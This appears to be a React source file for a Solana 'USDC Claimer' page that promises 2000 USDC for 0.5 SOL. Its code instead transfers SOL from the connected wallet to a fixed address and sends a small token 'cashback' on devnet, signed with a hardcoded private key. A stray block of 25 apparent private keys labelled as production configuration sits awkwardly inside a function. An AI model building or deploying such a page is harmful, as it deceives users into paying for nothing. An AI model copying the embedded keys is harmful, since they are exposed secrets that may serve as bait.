/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5NEbdqjDyohxLj1JkUrj3KXfxZWZVeXnNFeZAKXnerXnSeEvnPYLLHwwst2zncacJeTDVc3e9Hnw5ve4z9TKwLZE"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "549swbw6NqcVhvo4fz4hfv7Q3qPaGfvoov8HViHCdps7QXhMigMnJ9NJeJieNbrhdtBEFLj4rvAmXmG9DRDvgjVM",
  "key1": "Z5r3yQH5NW1fukZiwK3DPvDBkQbBMe43xV45z86f5A2fiRViN52P2ok1riV7dwJMa2q1vt6KH6unBDEuM2x8QGV",
  "key2": "4Uq1BFWcNrsm52zcndnbFA85HWZvxYmXLH1eWQ8fLaQHzBALLDgz3TtBhKTkgzCJpMyfLQJRUH2HHTF8rLgQY2Pq",
  "key3": "43XBkVXaJQ5yNg1Z8dRH8PAMnZDrnf2duczkXdaFXhgYoRuj8rufsNK97dhzv4RvYhH2UtmVrZWLaYAPzRuHb6S5",
  "key4": "3HcqsyKHZmZvacPqftNkTx8ydRjVWv3tuMjaPeruMM6dHwEXSbrZLczT1SvknAgWsYKMrji9vLML9DJi78ErVBbb",
  "key5": "4zoPHS6JaBSx2bBqQS7CmC8es5iZebSrDf4UzvqpGp9vZuQCfeeBZA7SSkiDqXPbWBtQfwe8FmvXm2H6oNJsYaA5",
  "key6": "Dv3GPq9CxP7Y7rrhJ2LHKKqjeVitP21sNgZezczrLnvUoZoaQ3zEZwJ7eRNgYwCEoj7XX2UkdbLZcVZUwCNKwhb",
  "key7": "5k93RYRXdzrZGmqDeLHu8NoMhY576jGfzaVVC4Gk6dziNonmUWbpsWP34YyNY9SDLdBxAPFioGZCaHPzAB5Uy557",
  "key8": "3JcqZSNweBLtNiMCgKwugPb9waoaCgGFn9UtyFesicaAAqBtFuL9h1BwgH3e4h9731Xd17cJCcQwSEDCi9BaLVu3",
  "key9": "4aXHLpBjKQMDD8KhDpMwupFqeLf19qsMxV1g14P4PZfqyTZmYtN1b42o3NubYVcTaCdFK1PkBw4jZVspLDDmJYry",
  "key10": "2C8B4z7GcYdVX7UUotzcEL9spT49BNYsCUp1s7FcrgtvUqKQRJBnLQ1TR7mtxXZVsfLh3EpGDEobWnjR2eF2Bm9C",
  "key11": "4SCmSRmj6pBjn4zhEZKNKBHXEd1UPXQHE8aYEXhbierF9STvfFvBccfwo7Fsx4CPFhW4yAvdgWcUijTCRd3E6gRj",
  "key12": "dj8sWVPFgqVtGUi8kSYHTPzuBpTdrdPxMpE23VumXqkT3MgFNZVZ5eqhpg2KPfcfMF3NEoDFzuLTwqg1w6ozxh9",
  "key13": "3TyPvUqYbtNK7v95snPbeK6toQ3tKBnMbPWgYuLYGouQv9nvTmsCjiS1qpL5HmMNr2LKHjJGq9dKnuRA1mtYECv",
  "key14": "4XGM2XVqAny1cJjx57U3cmJVNdM2zP7vwKL8LSPES7z777VMJqqLi3xug8w2SRJmTrieZrMJ4uePm3xp759bhMkP",
  "key15": "5kDSXMf6WPbmNpZ2DVrvABR7cpBMAoSETZZqieV6yiC3BEQjT2t4srv8aJg2mmsyLi41aEfrL4a1FVGptEAXMXss",
  "key16": "2u6UphDXk8YPaUXrJ5fku9yyJ4XKec9NNkaSgTMZj1YAXAth5AjxRJ99dmnyjKNU8CsdegSVQ8morg97qkno3shT",
  "key17": "65TT65xjh1qBWTqArJ3tcxZKEW26ABkLzJ17hA9MhbmraWzFr2fok43xBBhRKbnGsjEhG4wTzj8uPnHARoJovVAv",
  "key18": "3m24JqHRVFaAGWD3YihBy7nTgKmaH4du6H2DvGDsVMqZawdhBMtt3dg7JBXm4EoihmytgHAzHmT2ir3CDNBdipUA",
  "key19": "3512dCCqiSEucBhZXNQqhPBSbrezHVKK9AiyCixvastKdEEebJG9TLJHAiPD7FbbGqRNL6wzxpXujZFFYzeyZAsn",
  "key20": "2PniSiVr3o1Qg2xr3fHnEhYaNMZB5KCbd6XAChpAdrKPmb8Cm4ezsrAN5p9VrubYTF6WkuYcsy4NNDWqVRgRrAkx",
  "key21": "2EkHXTG1HUVatVrjALfrT2fZg63EtXuxutjsb7wLF7r8YuFjz92YHztYN6XFkQbzWEV7Ni3HwecZvbXxNDLZh5Di",
  "key22": "2VzbNCcP8vDT5Ab8ZRNhB1HcnYKuUi1uqJqyDRtwLvSijSMdYGz1q9aAf1EpYu74796mKmE8CKCQGtSojn72FXK9",
  "key23": "3N7bnYWgvk2VkRric6Vnte46szyJfMmVGC7mon5QU4zPzv4SxxeRwLabwrPH5dRk6FqCERXHUEt91aYuwPgFvwpT",
  "key24": "2TSPkC8QrZnQRbTdShHkyab6hxq3VhpyeUKGr12kGyGJHapEPAhER42mdot4ZpHMje1KkkmZv8WnXLd8hiCbWGYw"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
